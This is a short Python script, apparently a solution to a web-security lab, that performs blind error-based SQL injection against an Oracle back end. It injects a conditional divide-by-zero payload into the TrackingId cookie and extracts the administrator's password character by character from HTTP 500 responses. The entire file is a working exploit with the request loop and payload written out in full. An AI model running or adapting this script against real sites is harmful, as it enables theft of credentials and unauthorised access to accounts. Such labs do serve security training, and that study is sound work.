import requests
import urllib3
import urllib
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def SQLi_error(url):
    password_extracted =""
    for i in range(1, 21):
        for j in range(32, 126):
            payload= "'||(SELECT CASE WHEN ascii(SUBSTR(password,%s,1))='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (i,j)
            payload_encode= urllib.parse.quote(payload)
            cookie = {'TrackingId': 'Pv5cBn0qAiqYVCyA'+payload_encode, 'session': '8IjFyi2GMlCkHanKrX4OB7atU3FIYwNK'}
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxy)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r'+ password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    try:
        url = sys.argv[1]
    except IndexError:
        print(" [-] Usage: %s <url> " % sys.argv[0])
        print(" [-] Example: %s www.example.com" % sys.argv[0])
    SQLi_error(url)


if __name__ == "__main__":
    main()